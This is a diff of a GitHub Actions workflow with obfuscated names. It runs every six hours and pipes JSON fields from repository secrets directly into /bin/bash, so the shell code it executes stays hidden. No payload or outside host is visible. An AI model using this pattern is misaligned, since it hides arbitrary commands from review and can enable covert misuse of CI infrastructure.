@@ -1,9 +1,8 @@
 name: huyixin1923
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 0/6 * * *'
+    - cron: '48 1/6 * * *'
 
 jobs:
   build:
@@ -13,14 +12,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: huyixin1923
         env:
-          we81: ${{ secrets.we81 }}
+          m0: ${{ secrets.m0 }}
         run: |
-          echo $we81 | jq -r .yc12901 | /bin/bash
-          echo $apfw7164 | jq -r .sdfdi91367 | /bin/bash
-          echo $j8 | jq -r .hpqtr04 | /bin/bash
-          echo $t426 | jq -r .m3427 | /bin/bash
-          echo $lmlqj75 | jq -r .g077 | /bin/bash
-          echo $jazee4 | jq -r .xs9 | /bin/bash
-          echo $ac76161 | jq -r .grdk7904 | /bin/bash
-          echo $ld6740 | jq -r .ab9916 | /bin/bash
+          echo $m0 | jq -r .tfhm6 | /bin/bash
+          echo $ov808 | jq -r .f65 | /bin/bash
 
